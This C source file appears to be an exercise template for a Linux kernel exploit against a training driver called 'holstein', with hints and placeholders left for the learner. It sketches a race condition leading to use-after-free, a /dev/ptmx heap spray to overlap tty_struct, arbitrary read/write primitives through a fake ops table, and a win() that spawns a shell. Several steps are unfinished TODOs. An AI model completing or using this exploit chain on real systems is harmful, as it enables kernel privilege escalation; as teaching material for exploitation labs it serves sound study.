#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <sched.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/prctl.h>
#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

#define is_error(c, s)          \
    {                           \
        if ((c)) {              \
            perror((s));        \
            exit(EXIT_FAILURE); \
        }                       \
    }

void hexdump(void *mem, unsigned int len)
{
	unsigned int i, j;

	for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
	{
		/* print offset */
		if(i % HEXDUMP_COLS == 0)
		{
			printf("0x%06x: ", i);
		}

		/* print hex data */
		if(i < len)
		{
			printf("%02x ", 0xFF & ((char*)mem)[i]);
		}
		else /* end of block, just aligning for ASCII dump */
		{
			printf("   ");
		}

		/* print ASCII dump */
		if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
		{
			for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
			{
				if(j >= len) /* end of block, not really printing */
				{
					putchar(' ');
				}
				else if(isprint(((char*)mem)[j])) /* printable char */
				{
					putchar(0xFF & ((char*)mem)[j]);        
				}
				else /* other char */
				{
					putchar('.');
				}
			}
			putchar('\n');
		}
	}
}



#define AAR_GADGET ????
#define AAW_GADGET ????

int fd1 = 3;
int fd2 = 4;
int race_win;
int target_fd;
char buf[0x500];
uint64_t kernel_base;
uint64_t gbuf_addr;

void AAW(uint64_t* dst, unsigned int val){
	uint64_t* fake_ops = buf + 0x300;
	fake_ops[12] = kernel_base + AAW_GADGET;
	*(uint64_t*)(buf + 0x18) = gbuf_addr + 0x300;
	write(fd2, buf, 0x400);
	ioctl(target_fd, val, dst);
}

unsigned int AAR(uint64_t* src){
	uint64_t* fake_ops = buf + 0x300;
	fake_ops[12] = kernel_base + AAR_GADGET;
	*(uint64_t*)(buf + 0x18) = gbuf_addr + 0x300;
	write(fd2, buf, 0x400);
	return ioctl(target_fd, 0, src);
}

void race(cpu_set_t* cpu){
	//pin cpu 
	sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu);
	

	while(1){
		//race
		while(!race_win){
            // TODO - trigger race
            // hint : file discriptor start with 3, 4
            // We need to two file discriptor of victim object. (for triggering uaf)
		}
		
		//write test
		if(write(fd1, "A", 1) != 1 || write(fd2, "A", 1) != 1){
			close(fd1);
			close(fd2);
			race_win = 0;
		}
		else{
			printf("[+] win race!\n");
			break;
		}
	}

	usleep(1000);
}

int spray(cpu_set_t* cpu){
	//pin cpu 
	sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu);
	uint16_t x;
	int spray[800];
	for(int i=0; i< 800; i++){
		spray[i] = open( "/dev/ptmx" , O_RDONLY | O_NOCTTY);
		if(spray[i] == -1){
			for(int j=0; j < i; j++){
				close(spray[j]);
			}
		}
        
        // TODO - with fd2, we can read the kernel buffer. 
        // Then, how can i figure out tty_struct located in kernel buffer?
        // hint : tty_struct has magic number 
		if(){
			for(int j=0; j < i; j++){
				close(spray[j]);
			}
			return spray[i];
		}
	}
	return -1;
}


void win(){
    system("/dummy");
    system("/shell");
}

#define kernel_offset ???
#define modprobe  ????
int main() {
	pthread_t th1, th2;

	cpu_set_t cpu0, cpu1;
	CPU_ZERO(&cpu0);
	CPU_ZERO(&cpu1);
	CPU_SET(0, &cpu0);
	CPU_SET(1, &cpu1);

    //////////////////// step 1 /////////////////////////

    // TODO - make 2 thread to trigger race 


	char buf[0x500];
	//test
	write(fd1, "hello", 5);
	read(fd2, buf, 5);
	hexdump(buf, 5);
    /////////////////////////////////////////////////////

    //////////////////// step 2 /////////////////////////
    printf("[-] free(fd1) and fd2 still has controle of holstein!\n");
	printf("[?] But... which cpu freed the kernel heap??\n");
	close(fd1);
	memset(buf, 0, 0x500);
	write(fd2, buf, 0x10);
    target_fd = -1;

    // TODO - use spray with cpu0

    if(target_fd == -1){

		// TODO - use spray with cpu1

		if(target_fd == -1){
			printf("[-]bad...\n");
			exit(0);
		}
	}
	printf("[-] target fd is %d\n", target_fd);
	printf("[!] now we can controle tty struct!\n");
	read(fd2, buf, 0x400);
	hexdump(buf, 0x400);

    /////////////////////////////////////////////////////

    //////////////////// step 3 /////////////////////////

    // exploit

    /////////////////////////////////////////////////////
    return 0;
}
